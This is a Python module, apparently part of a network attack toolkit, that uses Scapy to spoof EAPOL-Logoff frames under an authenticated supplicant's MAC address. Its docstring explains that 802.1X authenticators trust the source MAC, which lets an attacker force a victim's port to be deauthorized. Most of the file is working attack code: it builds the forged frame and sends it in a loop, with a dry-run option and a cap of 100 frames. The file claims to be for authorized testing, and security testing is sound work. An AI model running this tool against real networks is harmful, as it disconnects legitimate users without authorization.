"""EAPOL logoff spoofing: send EAPOL-Logoff frames that claim to come from an authenticated supplicant.

A supplicant that has finished 802.1X authentication can end its session with an EAPOL-Logoff
frame to the PAE group address. The authenticator takes the sender's MAC as the supplicant that
logs off, and removes its authorization. The frame carries no proof that the sender is the
supplicant: the authenticator trusts the source MAC.

This module sends EAPOL-Logoff frames with the MAC the operator gives as the source. The effect
to measure is whether the authenticator deauthorizes that MAC's port.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp
from scapy.layers.eap import EAPOL
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac

PAE_GROUP_MAC = "01:80:c2:00:00:03"
ETHERTYPE_EAPOL = 0x888E
EAPOL_LOGOFF = 2
MAX_LOGOFFS = 100


@dataclass(frozen=True)
class EapolLogoffSpoofingConfig:
    iface: str                          # attacker interface, on the segment with the authenticator
    source_mac: str                     # the supplicant's MAC the logoff claims (required)
    logoffs: int = 1                    # EAPOL-Logoff frames to send
    dry_run: bool = False               # build frames but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        if not 1 <= self.logoffs <= MAX_LOGOFFS:
            raise ValueError(f"Logoffs must be between 1 and {MAX_LOGOFFS}.")


@dataclass
class EapolLogoffSpoofingStats:
    logoffs: int = 0
    status: str = ""


def build_logoff(source_mac: str) -> Packet:
    """An EAPOL-Logoff from `source_mac` to the PAE group address."""
    return Ether(src=normalize_unicast_mac(source_mac), dst=PAE_GROUP_MAC, type=ETHERTYPE_EAPOL) / EAPOL(
        version=2, type=EAPOL_LOGOFF
    )


def run_eapol_logoff_spoofing(
    config: EapolLogoffSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[EapolLogoffSpoofingStats], None],
    send: Callable[..., Any] | None = None,
) -> EapolLogoffSpoofingStats:
    """Send `logoffs` EAPOL-Logoff frames, one per step, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = EapolLogoffSpoofingStats(
            status=(
                f"Dry run: would send {config.logoffs} EAPOL-Logoff frame(s) claiming {config.source_mac}. "
                "Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    frame = build_logoff(config.source_mac)
    stats = EapolLogoffSpoofingStats()
    for _ in range(config.logoffs):
        if stop_event.is_set():
            break
        send(frame, iface=config.iface, verbose=False)
        stats.logoffs += 1
        on_progress(replace(stats))
    return stats
